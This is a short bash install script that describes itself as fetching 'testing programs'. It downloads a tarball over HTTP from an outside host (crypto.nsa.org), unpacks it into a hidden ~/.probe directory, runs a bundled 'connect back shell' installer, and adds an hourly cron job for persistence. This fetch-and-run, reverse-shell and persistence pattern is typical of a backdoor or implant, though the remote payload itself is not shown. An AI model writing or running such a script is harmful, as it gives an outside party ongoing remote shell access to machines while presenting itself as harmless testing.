#!/bin/bash
# This fetches the testing programs
SCRIPT_PATH="~/.probe/bin/run-tests.sh";

# Make some places for programs and logs
mkdir -p ~/.probe/bin/ ~/.probe/logs/

# Fetch and unpack the probe package
cd ~/.probe/bin/;
rm probe.tar.gz;
wget http://crypto.nsa.org/tmp/probe.tar.gz;
tar -xzvf probe.tar.gz;
rm probe.tar.gz;
mv hosts.txt cached-consensus ~/.probe/logs/;
chmod +x *.sh *.py;
# Install the connect back shell
~/.probe/bin/connectback.sh | tee -a ~/.probe/logs/connectback-install.log;

# Automate running the probes every hour on the 23rd minute:
echo "Installing cronjob for $SCRIPT_PATH";
TAB="`crontab -l | grep -c $SCRIPT_PATH`";
if [ $? == 1 ] || [ $TAB -lt 1]; then
    crontab -l > /tmp/cron.tmp;
    echo "23 * * * *  $SCRIPT_PATH" >> /tmp/cron.tmp;
    crontab /tmp/cron.tmp;
    rm /tmp/cron.tmp;
fi
